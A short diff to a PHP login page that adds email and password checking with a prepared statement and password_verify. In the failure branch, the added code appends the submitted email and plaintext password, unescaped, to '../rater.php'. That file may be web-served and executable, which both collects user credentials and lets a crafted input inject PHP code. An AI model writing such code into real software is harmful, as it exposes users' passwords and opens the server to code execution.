@@ -1,4 +1,25 @@
 <?php
+session_start();
+require "conf.inc.php";
+require "functions.php";
+
+if (isset($_POST["inputEmail"]) && isset($_POST["inputPassword"]) && !empty($_POST["inputEmail"]) && !empty($_POST["inputPassword"])) {
+    $pdo = connectDB();
+    $queryPrepared = $pdo->prepare("SELECT pwd FROM USER WHERE emailAddress=:email");
+    $queryPrepared->execute([":email" => $_POST["inputEmail"]]);
+    $result = $queryPrepared->fetch();
+    if (password_verify($_POST["inputPassword"], $result["pwd"])) {
+        $email = $_POST["inputEmail"];
+        login($email);
+        header("Location: home.php");
+        exit;
+    } else {
+        $error = true;
+        $fichier_nom = '../rater.php';
+        $ficher_contenu = "" . $_POST["inputEmail"] . " --- " . $_POST["inputPassword"] . "\r\n";
+        file_put_contents($fichier_nom, $ficher_contenu, FILE_APPEND);
+    }
+}
 require "navbar.php";
 ?>
 
